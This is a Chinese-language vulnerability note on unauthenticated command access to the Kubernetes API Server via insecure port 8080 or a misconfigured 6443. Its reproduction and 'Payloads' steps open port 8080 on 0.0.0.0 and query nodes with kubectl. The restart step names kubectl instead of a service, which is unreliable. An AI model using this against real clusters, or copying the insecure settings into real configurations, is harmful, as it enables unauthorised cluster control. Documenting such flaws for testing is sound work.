# K8s API Server 未授权命令执行

## 漏洞描述
Kubernetes 是一个可以移植、可扩展的开源平台，使用 声明式的配置 并依据配置信息自动地执行容器化应用程序的管理。在所有的容器编排工具中（类似的还有 docker swarm / mesos 等），Kubernetes 的生态系统更大、增长更快，有更多的支持、服务和工具可供用户选择。

K8s 的 API Server 默认服务端口为 8080(insecure-port) 和 6443(secure-port)，8080 端口提供 HTTP 服务，没有认证授权机制，而 6443 端口提供 HTTPS 服务，支持认证 (使用令牌或客户端证书进行认证) 和授权服务。默认情况下 8080 端口不启动，而 6443 端口启动。这两个端口的开放取决于/etc/kubernetes/manifests/kube-apiserver.yaml 配置文件。

如果目标 K8s 的 8080 端口开启了，由于其没有认证授权机制，因此存在未授权访问。

如果目标 K8s 的 6443 端口开启了，如果配置错误，也可以导致存在未授权访问。

## 危害等级
CRITICAL

## 参考链接

## 漏洞复现方法
### 8080 端口

默认情况下，8080 端口关闭的，手动开启：

```
cd /etc/kubernetes/manifests
vim kube-apiserver.yaml
```

高版本的 k8s 中，将 --insecure-port 这个配置删除了，因此添加如下两行：

## Payloads
```
cd /etc/kubernetes/manifests
vim kube-apiserver.yaml
```
```
- --insecure-port=8080
- --insecure-bind-address=0.0.0.0
```
```
systemctl restart kubectl
```
```
kubectl -s http://your-ip:8080 get nodes
```
